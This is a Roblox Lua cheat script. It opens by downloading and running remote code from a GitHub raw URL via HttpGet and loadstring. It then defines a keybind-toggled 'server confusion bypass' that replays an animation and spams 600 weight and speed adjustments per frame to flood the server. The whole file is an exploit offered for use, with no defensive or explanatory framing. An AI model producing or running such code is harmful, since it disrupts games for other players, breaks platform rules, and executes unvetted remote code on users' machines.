-- // GINGERHUB LOADER + SERVER CONFUSION \\ --
local GINGERHUB_LINK = "https://raw.githubusercontent.com/panoww07/gingerhub/refs/heads/main/apstein.lua"

-- 1. THE HUB LOADER
task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet(GINGERHUB_LINK))()
    end)
    if not success then
        warn("GingerHub failed to load: " .. tostring(err))
    end
end)

-- 2. THE SERVER CONFUSION BYPASS (JAN 2026)
local player = game.Players.LocalPlayer
local active = false
local confusionId = "rbxassetid://15264639453" 

game:GetService("UserInputService").InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.K then
        active = not active
        print("Confusion Mode:", active)
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    if active then
        local char = player.Character
        local animator = char and char:FindFirstChildOfClass("Humanoid") and char.Humanoid:FindFirstChildOfClass("Animator")
        
        if animator then
            -- Force-clean to stay under the 32-track limit
            for _, t in pairs(animator:GetPlayingAnimationTracks()) do
                t:Destroy()
            end

            -- Payload
            local a = Instance.new("Animation")
            a.AnimationId = confusionId
            local t = animator:LoadAnimation(a)
            t:Play()

            -- Weight Spam (600 packets per frame)
            for i = 1, 600 do
                t:AdjustWeight(math.random(1, 100) / 10)
                t:AdjustSpeed(math.random(1, 100) / 10)
            end
            
            task.spawn(function()
                task.wait()
                t:Destroy()
                a:Destroy()
            end)
        end
    end
end)
